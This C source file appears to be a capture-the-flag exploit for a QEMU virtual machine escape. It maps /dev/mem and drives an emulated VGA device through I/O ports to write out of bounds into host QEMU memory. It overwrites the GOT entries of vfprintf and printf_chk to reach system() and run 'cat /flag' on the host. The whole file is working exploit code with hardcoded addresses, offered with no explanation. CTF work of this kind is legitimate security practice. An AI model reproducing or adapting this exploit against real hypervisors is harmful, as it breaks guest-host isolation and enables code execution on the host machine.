#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

uint32_t mmio_addr = 0xfebc1000;
uint32_t mmio_size = 0x1000;
uint32_t vga_addr = 0xa0000;
uint32_t vga_size = 0x20000;

unsigned char* mmio_mem;
unsigned char* vga_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void set_sr(unsigned int idx, unsigned int val){
    outb(idx,0x3c4);
    outb(val,0x3c5);
}

void vga_mem_write(uint32_t addr, uint8_t value)
{
    *( (uint8_t *) (vga_mem+addr) ) = value;
}

void set_latch( uint32_t value){
    char a;
    a = vga_mem[(value>>16)&0xffff];
    write(1,&a,1);
    a = vga_mem[value&0xffff];
    write(1,&a,1);
}

int main(int argc, char *argv[])
{
    //step 1 mmap /dev/mem to system, (man mem) to see the detail
    system( "mknod -m 660 /dev/mem c 1 1" );
    int fd = open( "/dev/mem", O_RDWR | O_SYNC );
    if ( fd == -1 ) {
        return 0;
    }
    //step2 map the address to fd
    mmio_mem = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mmio_addr );
    if ( !mmio_mem ) {
        die("mmap mmio failed");
    }

    vga_mem = mmap( NULL, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr );
    if ( !vga_mem ) {
        die("mmap vga mem failed");
    }

    if (ioperm(0x3b0, 0x30, 1) == -1) {
        die("cannot ioperm");   
    }

    set_sr(7,1);
    set_sr(0xcc,4);     //v7==4
    set_sr(0xcd,0x10);  //vs[0x10]

    // write cat /flag to bss
    char a;
    unsigned int index = 0;
    uint64_t bss = 0x10C9850;
    char* payload = "cat /flag";
    a=vga_mem[1];write(1,&a,1); //init latch
    set_latch(bss);     //set latch[0]
    for (int i=0; i<9; i++) {
        write(1,&payload[i],1);
        vga_mem_write(0x18100,payload[i]);
    }
    index+=9;
    
    //qemu_logfile -> bss
    uint32_t qemu_logfile = 0x10CCBE0;
    set_latch(qemu_logfile-index);
    payload = (char*)&bss;
    printf("%s\n",payload);
    for (int i=0; i<8; i++) {
        vga_mem_write(0x18100,payload[i]);
    }
    index+=8;

    //vfprintf.got -> system.plt
    uint32_t vfprintf_got=0xEE7BB0;
    uint64_t system_plt=0x409DD0;
    set_latch(vfprintf_got-index);
    payload = (char*)&system_plt;
    printf("%s\n",payload);
    for (int i=0; i<8; i++) {
        vga_mem_write(0x18100,payload[i]);
    }
    index+=8;

    //printf_chk_got -> qemu_log
    uint64_t qemu_log = 0x9726E8;
    uint32_t printf_chk_got=0xEE7028;
    set_latch(printf_chk_got-index);
    payload = (char*)&qemu_log;
    printf("%s\n",payload);
    for (int i=0; i<8; i++) {
        vga_mem_write(0x18100,payload[i]);
    }

    set_sr(0xcc,2);
    vga_mem_write(0x18100,1);//printf_chk

    return 0;
}
